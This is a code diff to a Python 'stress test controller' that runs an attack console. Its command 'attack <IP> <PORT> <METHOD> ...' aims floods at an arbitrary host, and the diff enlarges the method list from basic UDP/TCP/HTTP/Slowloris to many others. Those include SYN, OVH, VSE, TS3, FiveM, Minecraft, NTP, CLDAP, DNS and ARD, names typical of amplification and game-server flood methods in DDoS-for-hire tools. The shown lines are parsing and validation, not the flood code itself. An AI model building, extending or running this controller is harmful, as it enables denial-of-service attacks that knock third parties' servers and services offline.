@@ -93,7 +93,6 @@ def print_prompt():
     sys.stdout.write("aegis-stress> ")
     sys.stdout.flush()
 
-
 BANNER = r"""
    _____  _____ _____ _____ _____
   / ____|/ ____|_   _/ ____|_   _|
@@ -102,12 +101,19 @@ BANNER = r"""
   ____) |____) |_| |_____) |_| |_| | |  __/\__ \__ \
  |_____/|_____/|_____|_____/|_____|_|  \___||___/___/
 
-  AegisShield Stress Test Controller v3.0 (ADVANCED)
+  AegisShield Stress Test Controller v4.0 (ULTIMATE)
 """
 
+VALID_METHODS = {
+    "udp", "tcp", "http", "https", "slow", 
+    "syn", "ovh", "cps", "icmp", "connection", 
+    "vse", "ts3", "fivem", "fivem-token", "mem", 
+    "ntp", "mcbot", "minecraft", "mcpe", "dns", 
+    "char", "cldap", "ard", "rdp"
+}
 
 def main():
-    parser = argparse.ArgumentParser(description="Stress Test Controller v3")
+    parser = argparse.ArgumentParser(description="Stress Test Controller v4")
     parser.add_argument("--port", type=int, default=7777, help="Listen port")
     parser.add_argument("--host", default="0.0.0.0", help="Listen address")
     args = parser.parse_args()
@@ -173,9 +179,7 @@ def main():
         elif cmd == "attack":
             if len(parts) < 6:
                 print("  Usage: attack <IP> <PORT> <METHOD> <SIZE|RAND> <DURATION> [POWER%]")
-                print("  Example (Max Power):    attack 1.1.1.1 80 tcp 1024 60 100")
-                print("  Example (Low Power):    attack 1.1.1.1 80 udp RAND 60 10")
-                print("  Example (Slowloris):    attack 1.1.1.1 80 slow 0 120 100")
+                print("  Valid methods: " + ", ".join(VALID_METHODS))
                 continue
 
             target_ip = parts[1]
@@ -193,8 +197,9 @@ def main():
                 except ValueError:
                     pass
 
-            if method not in ("udp", "tcp", "http", "https", "slow"):
-                print("  ❌ Method must be: udp, tcp, http, https, slow")
+            if method not in VALID_METHODS:
+                print(f"  ❌ Unknown method: {method}")
+                print(f"  Valid methods: " + ", ".join(VALID_METHODS))
                 continue
 
             # Parse size (RAND means random 1 to 65507 bytes)
